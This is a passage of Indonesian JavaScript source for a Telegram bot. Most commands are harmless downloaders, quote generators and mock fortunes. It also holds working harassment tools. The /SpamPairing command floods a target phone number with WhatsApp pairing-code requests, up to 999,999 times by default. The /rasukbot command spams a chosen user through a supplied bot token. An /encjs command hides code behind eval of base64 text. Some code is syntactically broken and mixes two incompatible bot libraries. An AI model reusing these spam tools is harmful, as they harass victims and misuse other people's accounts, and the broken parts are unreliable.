try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
        return ctx.reply("❌ Update gagal: File kosong!");
    }

    fs.writeFileSync("./index.js", data);

    await ctx.reply(
        "✅ Update berhasil!\n🔄 Bot akan restart..."
    );

    process.exit(0);
} catch (e) {
    console.error(e);

    await ctx.reply(
        "❌ Update gagal.\nPastikan repo dan file index.js tersedia."
    );
}

});

bot.command("addfile", async (ctx) => {
const args = ctx.message.text.split(" ").slice(1);

if (!args.length) {
    return ctx.reply(
        "❌ Contoh:\n/addfile index.js\n\nReply pesan yang berisi isi file."
    );
}

if (!ctx.message.reply_to_message) {
    return ctx.reply(
        "❌ Reply pesan yang berisi isi file.\n\nContoh:\n/addfile index.js"
    );
}

const fileName = args.join(" ");
const fileContent = ctx.message.reply_to_message.text;

try {
    const content = Buffer.from(fileContent).toString("base64");

    await axios.put(
        `https://api.github.com/repos/rahayudewilestari50-netizen/v7/contents/${fileName}`,
        {
            message: `Add ${fileName}`,
            content
        },
        {
            headers: {
                Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
                Accept: "application/vnd.github+json"
            }
        }
    );

    await ctx.reply(
        `✅ File berhasil ditambahkan!\n📄 Nama: ${fileName}`
    );
} catch (err) {
    console.error(err.response?.data || err);

    await ctx.reply(
        `❌ Gagal upload file.\n${err.response?.data?.message || err.message}`
    );
}

});

bot.command("delfile", async (ctx) => {
const args = ctx.message.text.split(" ").slice(1);

if (!args.length) {
    return ctx.reply(
        "❌ Contoh:\n/delfile index.js"
    );
}

const fileName = args.join(" ");

try {
    const { data } = await axios.get(
        `https://api.github.com/repos/rahayudewilestari50-netizen/v7/contents/${fileName}`,
        {
            headers: {
                Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
                Accept: "application/vnd.github+json"
            }
        }
    );

    await axios.delete(
        `https://api.github.com/repos/rahayudewilestari50-netizen/v7/contents/${fileName}`,
        {
            headers: {
                Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
                Accept: "application/vnd.github+json"
            },
            data: {
                message: `Delete ${fileName}`,
                sha: data.sha
            }
        }
    );

    await ctx.reply(`✅ File berhasil dihapus!\n📄 ${fileName}`);
} catch (err) {
    console.error(err.response?.data || err);

    await ctx.reply(
        `❌ Gagal menghapus file.\n${err.response?.data?.message || err.message}`
    );
}

});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});




///tools\\\
bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Gxion Kece ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
 
// ========== COMMAND TIME (WIB, WITA, WIT) ==========
bot.command("time", async (ctx) => {
  const now = new Date();
  
  // WIB (UTC+7)
  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  
  // WITA (UTC+8)
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  
  // WIT (UTC+9)
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));
  
  // Format jam
  const formatJam = (date) => {
    return date.toLocaleTimeString("id-ID", { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      hour12: false
    });
  };
  
  // Format tanggal
  const formatTanggal = (date) => {
    return date.toLocaleDateString("id-ID", { 
      weekday: 'long', 
      day: 'numeric', 
      month: 'long', 
      year: 'numeric' 
    });
  };
  
  const pesan = 
`
<blockquote>
🕐 WAKTU SEKARANG 🕐

┌─────────────────┐
│ 🟢 WIB 
│    ${formatJam(wib)}
│    ${formatTanggal(wib)}
├─────────────────┤
│ 🟡 WITA
│    ${formatJam(wita)}
│    ${formatTanggal(wita)}
├─────────────────┤
│ 🔵 WIT
│    ${formatJam(wit)}
│    ${formatTanggal(wit)}
└─────────────────┘

✨ *Ketikan /start untuk kembali menu utama* ✨
</blockquote>
`;
  
  await ctx.reply(pesan, { parse_mode: "HTML" });
}); 
 
bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("snack", async (ctx) => {
  const text = ctx.message.text;
  const url = text.split(" ")[1];

  if (!url) {
    return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  }

  // validasi link dikit biar ga asal masukin sampah
  if (!url.includes("snackvideo")) {
    return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");
  }

  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");

    const res = await axios.get(
      `https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`,
      { timeout: 15000 } // biar ga ngegantung
    );

    const video = res?.data?.data?.video;

    if (!video) {
      return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");
    }

    await ctx.replyWithVideo(
      { url: video },
      {
        caption: "✅ Beres. Udah, jangan spam lagi"
      }
    );

  } catch (err) {
    console.log("ERROR:", err.message);

    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh\n- Internet lu kentang");
  }
});

bot.command(/\/gethtml(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = (match[1] || "").trim();

  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(
      chatId,
      "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil source code dari URL...");

    const res = await axios.get(url, { responseType: "text", timeout: 30000 });
    const html = res.data;

    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    await bot.sendDocument(chatId, filePath, {}, { filename: "source_code.html", contentType: "text/html" });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ *Terjadi kesalahan:*\n\`${err.message}\``, { parse_mode: "Markdown" });
  }
});

// ========== CATBOX DOWNLOADER (VERSI SIMPLE) ==========

bot.command("catbox", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const url = args[1];
  
  if (!url) {
    return ctx.reply(
`📥 *DOWNLOAD CATBOX* 📥

*Cara pakai:*
/catbox https://files.catbox.moe/xxxxx.jpg

*Support file:*
Gambar, Video, Audio, Dokumen

📌 *Maksimal file: 50MB*`,
      { parse_mode: "Markdown" }
    );
  }
  
  if (!url.includes('files.catbox.moe')) {
    return ctx.reply("❌ Bukan URL Catbox yang valid!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengunduh file...*", { parse_mode: "Markdown" });
  
  try {
    // Kirim langsung pake URL
    const ext = url.split('.').pop().toLowerCase();
    
    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
      await ctx.replyWithPhoto(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) {
      await ctx.replyWithVideo(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp3', 'wav', 'ogg'].includes(ext)) {
      await ctx.replyWithAudio(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else {
      await ctx.replyWithDocument(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    }
  } catch (err) {
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", { parse_mode: "Markdown" });
  }
});


bot.command("rasukbot", checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const input = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  // Jika hanya /rasukbot
  if (!input) {
    return ctx.replyWithHTML(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>"
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    // MODE REPLY
    if (reply) {
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 3) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|pesan|jumlah</code> (reply pesan target)"
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {
      // MODE MANUAL
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 4) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
        );
      }

      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.replyWithHTML(
        "❌ Format tidak valid!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 0; i < jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.replyWithHTML(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`
    );

  } catch (err) {
    await ctx.replyWithHTML(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`
    );
  }
});
  const quotes = [
    "Aku rela jadi yang kedua, asal kamu bahagia.",
    "Kamu tahu nggak? Kamu itu alasanku buka mata tiap pagi.",
    "Kalau cinta butuh pengorbanan, aku rela disakiti.",
    "Aku bukan yang terbaik, tapi aku akan berusaha jadi yang paling setia.",
    "Sayang, jangan pergi. Aku belum selesai mencintaimu.",
    "Kamu adalah alasan aku selalu tersenyum tiap hari.",
    "Cintaku kayak utang negara, nggak akan lunas sampai kapanpun.",
    "Kalau kamu bahagia sama dia, aku rela mundur walau hati hancur.",
    "Kalau cinta itu bodoh, maka aku bangga jadi yang paling bodoh.",
    "Cinta sejati itu bukan yang datang pertama, tapi yang bertahan sampai akhir.",
    "Setiap detik tanpamu itu siksaan.",
    "Aku ingin jadi alasan kamu bahagia, bukan alasan kamu terluka.",
    "Aku bucin karena kamu, bukan karena siapa-siapa.",
    "Kalau sayang bilang, jangan disimpan dalam diam.",
    "Jangan lelah mencintaiku, aku sedang belajar memperbaiki diri untukmu."
  ];
  bot.command("bucin", (ctx) => {
    const random = quotes[Math.floor(Math.random() * quotes.length)];
    ctx.reply(`💘 ${random}`);
  });

  const teks = [
    "Kadang, yang setia malah disia-siakan.",
    "Aku tersenyum, padahal hatiku hancur.",
    "Cinta tak selamanya indah, kadang menyakitkan.",
    "Aku rindu, tapi aku sadar aku bukan siapa-siapa.",
    "Jangan tanya kenapa aku diam, karena aku sudah lelah.",
    "Dulu kita dekat, sekarang hanya sisa kenangan.",
    "Aku mencintaimu, tapi kamu mencintainya.",
    "Kamu bahagia tanpaku, dan itu yang membuatku lebih sakit.",
    "Aku bertahan karena cinta, bukan karena tidak bisa pergi.",
    "Mereka bilang sabar, tapi hatiku sudah berdarah-darah.",
    "Terkadang, aku berharap tak pernah mengenalmu.",
    "Aku takut jatuh cinta lagi, karena sakitnya belum sembuh.",
    "Kamu ajari aku bahagia, lalu kamu pergi tinggalkan luka.",
    "Katanya cinta itu indah, kenapa aku selalu terluka?",
    "Aku sudah cukup kuat... sampai kamu datang lagi dengan luka baru."
  ];
  bot.command("sadboy", (ctx) => {
    ctx.reply(`😢 ${teks[Math.floor(Math.random() * teks.length)]}`);
  });
  

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

// ========== CEK MASA DEPAN ==========
bot.command("cekmasadepan", async (ctx) => {
  let targetName = "Kamu";
  
  // Cek apakah reply ke pesan orang
  if (ctx.message.reply_to_message) {
    const target = ctx.message.reply_to_message.from;
    targetName = target.first_name || "Dia";
  } else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) {
      targetName = args.slice(1).join(" ");
    }
  }
  
  // Data random
  const profesi = [
    "Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", 
    "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚",
    "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️",
    "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"
  ];
  
  const kekayaan = [
    "Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵",
    "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎",
    "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"
  ];
  
  const jodoh = [
    "Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸",
    "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊",
    "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"
  ];
  
  const rumah = [
    "Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️",
    "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️",
    "Rumah Impian ✨", "Kontrakan Dulu 😅"
  ];
  
  const kendaraan = [
    "Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡",
    "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️",
    "Helikopter Pribadi 🚁", "Naik Angkot 😂"
  ];
  
  const nasib = [
    "Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧",
    "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨",
    "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"
  ];
  
  // Random pilih
  const hasilProfesi = profesi[Math.floor(Math.random() * profesi.length)];
  const hasilKekayaan = kekayaan[Math.floor(Math.random() * kekayaan.length)];
  const hasilJodoh = jodoh[Math.floor(Math.random() * jodoh.length)];
  const hasilRumah = rumah[Math.floor(Math.random() * rumah.length)];
  const hasilKendaraan = kendaraan[Math.floor(Math.random() * kendaraan.length)];
  const hasilNasib = nasib[Math.floor(Math.random() * nasib.length)];
  
  const pesan = 
`
<blockquote>
🔮 RAMALAN MASA DEPAN 🔮
Untuk: ${targetName}

━━━━━━━━━━━━━━━━━━━━━━

👔 Profesi: ${hasilProfesi}
💰 Kekayaan: ${hasilKekayaan}
❤️ Jodoh: ${hasilJodoh}
🏠 Rumah: ${hasilRumah}
🚗 Kendaraan: ${hasilKendaraan}
🍀 Nasib:  ${hasilNasib}

━━━━━━━━━━━━━━━━━━━━━━
✨ Hasil ini hanya hiburan ya!
💪 Masa depan ada di tanganmu sendiri!

🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>`;

  ctx.reply(pesan, { parse_mode: "HTML" });
});

// COMMAND SINGKAT (opsional)
bot.command("ramal", async (ctx) => {
  const args = ctx.message.text.split(" ");
  let nama = "Kamu";
  if (args.length > 1) nama = args.slice(1).join(" ");
  
  const hasil = [
    "Sukses besar di usia 30an! 🎉",
    "Jadi pengusaha terkenal! 🏢",
    "Punya pasangan idaman! ❤️",
    "Hidup bahagia sampai tua! 😊",
    "Bisa beli rumah mewah! 🏰",
    "Keliling dunia bareng keluarga! 🌍",
    "Jadi orang yang bermanfaat! ✨"
  ];
  
  const random = hasil[Math.floor(Math.random() * hasil.length)];
  ctx.reply(`🔮 *Ramalan untuk ${nama}:*\n\n✨ ${random}\n\n🔮 *Ketik /ramal [nama] lagi!*`, { parse_mode: "HTML" });
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
// ========== CEK CUACA (HIBURAN) ==========
bot.command("cuaca", async (ctx) => {
  const kondisi = [
    "Cerah ☀️", "Berawan 🌥️", "Hujan Ringan 🌦️", "Hujan Lebat 🌧️",
    "Badai ⛈️", "Mendung 🌫️", "Panas Terik 🔥", "Dingin 🥶"
  ];
  
  const suhu = Math.floor(Math.random() * 20) + 20; // 20-40°C
  const kelembaban = Math.floor(Math.random() * 50) + 40; // 40-90%
  const randomKondisi = kondisi[Math.floor(Math.random() * kondisi.length)];
  
  ctx.reply(
`
<blockquote>
🌤️ PRAKIRAAN CUACA*l 🌤️

📌 Kondisi: ${randomKondisi}
🌡️ Suhu: ${suhu}°C
💧 Kelembaban: ${kelembaban}%
💨 Angin: ${Math.floor(Math.random() * 20) + 5} km/jam

✨ Perkiraan ini hanya hiburan ya!
🔮 Cuaca sebenarnya bisa berbeda</blockquote>`,
    { parse_mode: "HTML" }
  );
});
// ========== UPLOAD KE TELEGRAPH (GAMPANG & PASTI JALAN) ==========
bot.command("catboxurl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /tourl ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
// ========== ENKRIPSI KODE JS (NO ERROR - FIX) ==========

function simpleEncode(code) {
  let encoded = Buffer.from(code).toString('base64');
  return `eval(Buffer.from('${encoded}', 'base64').toString())`;
}

function simpleDecode(encrypted) {
  try {
    let match = encrypted.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
    if (match) {
      return Buffer.from(match[1], 'base64').toString();
    }
    return null;
  } catch(e) {
    return null;
  }
}

// COMMAND ENKRIPSI (FIX REPLY)
bot.command("encjs", (ctx) => {
  let code = "";
  
  // PRIORITAS: Ambil dari reply
  if (ctx.message.reply_to_message) {
    let replied = ctx.message.reply_to_message;
    if (replied.text) {
      code = replied.text;
    } else if (replied.caption) {
      code = replied.caption;
    }
  }
  
  // Jika tidak ada reply, ambil dari argumen
  if (!code) {
    let args = ctx.message.text.split(" ");
    args.shift();
    code = args.join(" ");
  }
  
  // Jika masih kosong, tampilkan bantuan
  if (!code.trim()) {
    return ctx.reply(
`🔒 *ENKRIPSI KODE JS* 🔒

📌 *Cara pakai:*
• /encjs console.log("Halo")
• Atau *reply* pesan yang berisi kode, lalu ketik /encjs

✅ *Contoh:*
[Kamu kirim pesan: console.log("test")]
[Lalu reply pesan itu dengan /encjs]`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleEncode(code);
  
  ctx.reply(
`🔐 *KODE TERPROTEKSI* 🔐

\`\`\`javascript
${hasil}
\`\`\`

📌 *Simpan kode asli!*`,
    { parse_mode: "Markdown" }
  );
});

// COMMAND DEKRIPSI
bot.command("decjs", (ctx) => {
  let encrypted = "";
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
    encrypted = ctx.message.reply_to_message.text;
  } else {
    let args = ctx.message.text.split(" ");
    args.shift();
    encrypted = args.join(" ");
  }
  
  if (!encrypted.trim()) {
    return ctx.reply(
`🔓 *DEKRIPSI KODE JS* 🔓

📌 *Cara pakai:*
Reply pesan yang berisi kode terenkripsi, lalu ketik /decjs`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleDecode(encrypted);
  
  if (hasil) {
    ctx.reply(
`🔓 *KODE ASLI* 🔓

\`\`\`javascript
${hasil}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", { parse_mode: "Markdown" });
  }
});
/// ========== TOOLS SPAM PAIRING =======\\\
bot.command(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});
// ========== MENU HARGA SCRIPT ==========
// ✨ Ganti isi array berikut sesuai produk & harga kamu ✨
bot.command('harga', async (ctx) => {
    try {
        const teks = `
\`\`\`JavaScript
╔══════════════════════════
║   🪧 HARGA SCRIPT
╠══════════════════════════
║⌬ FULL UP 5K
║⌬ RESELLER 10K
║⌬ PARTNER 20K
║⌬ MODERATOR 30K
║⌬ OWNER 40K
╚══════════════════════════\`\`\`
        `;

        await ctx.reply(teks, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "👑 Contact Owner", url: "https://t.me/fuckyanxz", style: "danger" }
                    ]
                ]
            }
        });

    } catch (err) {
        console.log(err);
        ctx.reply('Gagal menampilkan Bagian daftar /harga Di Karenakan Masalah Tertentu.');
    }
});
/// COMMAND CEK FUNCTION \\\
bot.command("cekfunction", async (ctx) => {
  try {

    if (!ctx.message.reply_to_message)
      return ctx.reply("Reply function JavaScript yang ingin dicek.");

    const text =
      ctx.message.reply_to_message.text ||
      ctx.message.reply_to_message.caption;

    if (!text)
      return ctx.reply("Pesan yang direply tidak berisi kode.");

    let acorn;
    try {
      acorn = require("acorn");
    } catch {
      return ctx.reply("Module acorn belum terinstall.\nInstall: npm install acorn");
    }

    try {

      acorn.parse(text, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true
      });

      return ctx.reply(
`🔎 Mengecek syntax function...

✅ SYNTAX VALID
Tidak ditemukan error.
`
      );

    } catch (err) {

      const lines = text.split("\n");
      const line = err.loc?.line || 0;
      const column = err.loc?.column || 0;

      const start = Math.max(0, line - 3);
      const end = Math.min(lines.length, line + 2);

      const snippet = lines
        .slice(start, end)
        .map((l, i) => {
          const num = start + i + 1;

          return num === line
            ? `👉 ${num} | ${l}`
            : `   ${num} | ${l}`;
        })
        .join("\n");

      return ctx.reply(
`❌ ERROR TERDETEKSI

${err.message}
Line ${line}:${column}

📌 CUPlikan:
\`\`\`JavaScript
${snippet}
\`\`\`
`
      );

    }

  } catch (e) {
    console.error(e);
    ctx.reply("Terjadi error saat mengecek function.");
  }
});
// ========== DISABLE / ENABLE COMMAND (NO OWNER ID, NO FS) ==========
let disabled = [];

// ================= OFF CMD =================
bot.command("offcmd", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (!args[1])
    return ctx.reply("⚠️ Contoh: /offcmd menu");

  const cmd = args[1].toLowerCase();

  if (disabled.includes(cmd))
    return ctx.reply(`⚠️ /${cmd} sudah nonaktif.`);

  disabled.push(cmd);

  return ctx.reply(`🚫 /${cmd} berhasil dinonaktifkan.`);
});

// ================= ON CMD =================
